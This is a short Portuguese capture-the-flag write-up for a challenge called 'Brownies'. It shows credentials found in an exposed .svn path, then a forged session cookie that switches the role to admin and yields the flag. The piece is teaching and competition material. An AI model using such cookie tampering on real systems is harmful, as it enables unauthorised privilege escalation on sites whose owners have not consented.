Brownies
========

Dada a descrição da task, uma das primeiras tentativas foi olhar: http://178.63.58.69:8083/.svn
O que continha o seguinte:

```
use this to try

user: ping
pass: pong

admin: john
```

Usando tal informação pra logar, notamos o seguinte cookie:

`Cookie: type=user; flag=df911f0151f9ef021d410b4be5060972; name=ping`

Como precisamos virar admin, tentamos modificar o cookie para:

`type=admin; flag=527bd5b5d689e2c32ae974c6229ff785; name=john`

O que foi o suficiente! Na página apareceu:

`<h4>Welcome: john</h4><br><a href='index.php'>Logout</a><h4>Hi faked admin :) </h4><br><h5>Flag: 'a012c434d1ec6db911fda4884de14fdd'</h5>`

